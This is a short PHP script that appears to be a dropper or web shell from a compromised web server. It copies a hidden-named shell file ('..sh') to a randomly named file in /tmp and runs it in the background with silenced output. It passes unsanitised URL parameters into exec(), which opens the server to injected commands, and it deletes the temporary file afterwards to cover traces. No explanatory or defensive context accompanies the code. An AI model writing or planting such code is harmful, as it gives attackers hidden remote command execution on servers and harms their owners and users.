<?php
$s = 'ab6cde3fg5hfsdlfjoejlgjfdljorejfl';
$n = $s{rand(0,strlen($s)-1)}.$s{rand(0,strlen($s)-1)}.$s{rand(0,strlen($s)-1)}.$s{rand(0,strlen($s)-1)};
file_put_contents("/tmp/$n", file_get_contents(__DIR__.'/..sh'));
exec("/bin/sh /tmp/$n " . $_GET['n'] . ' ' . $_GET['s'] . " > /dev/null &");
exec("rm -f /tmp/$n");
?>
